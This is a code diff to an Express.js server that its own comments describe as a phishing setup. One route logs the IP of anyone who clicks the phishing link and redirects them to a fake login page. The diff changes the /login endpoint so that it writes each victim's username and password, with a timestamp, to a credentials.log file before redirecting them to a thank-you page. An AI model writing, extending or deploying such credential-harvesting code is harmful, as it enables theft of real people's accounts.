@@ -1,6 +1,7 @@
 const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 
@@ -15,7 +16,7 @@ app.get('/click', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const timestamp = new Date();
 
-  // Log click info (consider storing securely in database or file)
+  // Log click info to console (can be extended to file or db)
   console.log(`Phishing link clicked from IP: ${ip} at ${timestamp}`);
 
   // Redirect user to phishing login page
@@ -30,13 +31,22 @@ app.get('/thankyou.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'thankyou.html'));
 });
 
-// Endpoint to capture POSTed credentials
+// Endpoint to capture POSTed credentials and log them to file
 app.post('/login', (req, res) => {
   const username = req.body.username;
   const password = req.body.password;
+  const timestamp = new Date().toISOString();
+  const logEntry = `${timestamp},${username},${password}\n`;
 
-  // Log credentials to console (replace with secure storage in production)
-  console.log('Captured credentials:', { username, password });
+  // Append credentials to log file
+  const logPath = path.join(__dirname, 'credentials.log');
+  fs.appendFile(logPath, logEntry, (err) => {
+    if (err) {
+      console.error('Error saving credentials:', err);
+    } else {
+      console.log('Credentials saved:', logEntry.trim());
+    }
+  });
 
   // Redirect user to thank you page after capturing credentials
   res.redirect('/thankyou.html');
